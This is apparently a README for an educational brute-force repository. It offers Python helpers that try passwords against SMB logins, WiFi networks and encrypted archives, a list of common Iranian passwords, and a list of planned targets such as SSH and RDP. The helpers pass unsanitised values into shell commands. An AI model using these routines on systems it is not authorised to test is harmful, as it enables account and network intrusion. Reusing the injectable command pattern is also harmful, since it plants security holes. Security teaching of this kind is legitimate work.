# Brute-force attack

**Author:** Peyman Majidi Moein (aka Peymanx) and Ai

This project is related to a YouTube video on the [peymanx](https://www.youtube.com/@peymanx) channel.

## Table of Contents

- [Introduction](#introduction)
- [Sample Code](#sample-code)
- [Content List](#content-list)
- [Resources](#resources)
- [License](#license)
- [TODO](#todo)

## Introduction

This repository contains various scripts and tools for performing brute-force attacks on different systems. The primary goal is to demonstrate the vulnerabilities and educate users on the importance of strong passwords and security measures.  

This repository contains a list of commonly used [passwords in Iran](./passwords/commons_iranians.txt). It's designed to help developers and security professionals understand password patterns in the region, improve password policies, and enhance security measures

## Preview
![login](https://github.com/user-attachments/assets/075a2c88-b7e9-41a7-8ee4-7d8e8392d867)

## Sample Code

```python

def connect_to_smb(ip, username, password):
    command = f'net use \\\\{ip} /user:{username} {password} >nul 2>&1'
    result = os.system(command)
    return result == 0


def connect_to_wifi(ssid, password):
    profile_path = create_wifi_profile(ssid, password)
    add_profile_command = f'netsh wlan add profile filename="{profile_path}"'
    connect_command = f'netsh wlan connect name="{ssid}"'
    os.system(add_profile_command)
    result = os.system(connect_command)
    os.remove(profile_path)
    return result == 0

def connect_to_zip(file, password):
    command = f'7z x "{file}" -p"{password}" -y >nul 2>&1'
    result = os.system(command)
    return result == 0


```

## Content List

- **passwords**
  - More password samples added (Jan 17, 2025)
- **login_hack.py**
  - Windows login hack 
- **wifi_hack.py**
  - WiFi hack 
- **zip_hack.py**
  - Compressed file password hack 

## Resources

- [SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments](https://github.com/danielmiessler/SecLists)
- [Persian Words Jadi :)](https://github.com/jadijadi/persianwords)
- [Iranian-Password-list](https://github.com/Dih4v/Iranian-Password-list)
- [Wikipedia](https://en.wikipedia.org/wiki/List_of_the_most_common_passwords)

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## TODO

- [x] Windows Login (smb) Brute-force
- [x] WiFi Modem Password Brute-force
- [ ] SSH Brute-force
- [x] Compress file (zip,rar,...) Brute-force
- [ ] Email Brute-force
- [ ] PDF Lock Brute-force
- [ ] RDP Brute-force
- [ ] SQL Server Connection Strings Brute-force
- [ ] MySql Brute-force
- [ ] Telnet Brute-force
